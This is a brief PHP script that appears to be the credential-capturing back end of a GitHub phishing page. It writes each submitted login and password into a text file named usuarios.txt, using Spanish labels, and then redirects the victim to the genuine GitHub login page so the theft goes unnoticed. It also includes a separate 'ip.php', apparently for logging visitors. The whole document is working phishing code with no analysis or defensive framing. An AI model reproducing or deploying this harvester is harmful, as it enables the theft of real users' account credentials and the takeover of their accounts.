<?php
include 'ip.php';

file_put_contents("usuarios.txt", "Cuenta: " . $_POST['login'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://github.com/login');
exit();